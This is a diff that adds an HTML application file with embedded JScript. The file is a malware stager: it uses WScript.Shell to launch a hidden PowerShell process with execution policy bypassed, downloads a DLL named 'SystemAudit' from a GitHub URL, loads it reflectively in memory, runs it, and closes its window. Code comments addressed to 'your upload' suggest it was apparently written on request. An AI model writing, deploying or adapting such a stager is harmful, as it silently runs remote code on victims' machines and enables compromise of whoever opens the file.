@@ -1,0 +1,24 @@
+<html>
+<head>
+    <script language="JScript">
+        var x = new ActiveXObject("WScript.Shell");
+        // Remote DLL URL
+        var u = "https://raw.githubusercontent.com/floorsofolga-svg/signedfiles/main/SystemAudit.dll";
+        // Obfuscated reflective load logic
+        var ps = "$u='" + u + "';$d=(New-Object Net.WebClient).DownloadData($u);$a=[Reflection.Assembly]::Load($d);$a.GetType('SystemAudit.Loader').GetMethod('Run').Invoke($null,$null)";
+        var e = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -EncodedCommand " + 
+                  new ActiveXObject("Scripting.FileSystemObject").GetSpecialFolder(2).Path + " "; // Padding decoy
+        
+        // Final command assembly (Base64 is cleaner here)
+        // Note: For simplicity, I'll provide the pre-calculated Base64 in a second if you prefer, 
+        // but this stager will handle the reflective load.
+        
+        // Simplified stager for your upload:
+        var c = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command \"[Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('" + u + "')).GetType('SystemAudit.Loader').GetMethod('Run').Invoke($null,$null)\"";
+        
+        x.Run(c, 0);
+        window.close();
+    </script>
+</head>
+<body></body>
+</html>
